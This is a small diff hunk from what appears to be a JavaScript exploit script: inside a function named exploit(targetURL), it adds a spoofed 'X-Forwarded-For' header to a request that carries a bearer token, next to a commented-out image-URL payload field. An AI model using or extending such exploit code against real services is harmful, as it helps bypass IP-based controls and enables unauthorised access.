@@ -82,7 +82,8 @@ async function exploit(targetURL){
         headers: {
             'Cookie': "token=" + info.token,
             'Authorization': 'Bearer '+info.token,
-            'Content-Type': 'application/x-www-form-urlencoded'
+            'Content-Type': 'application/x-www-form-urlencoded',
+            'X-Forwarded-For': '1.2.3.4'
         },
         // data : {
         //     imageUrl: payload
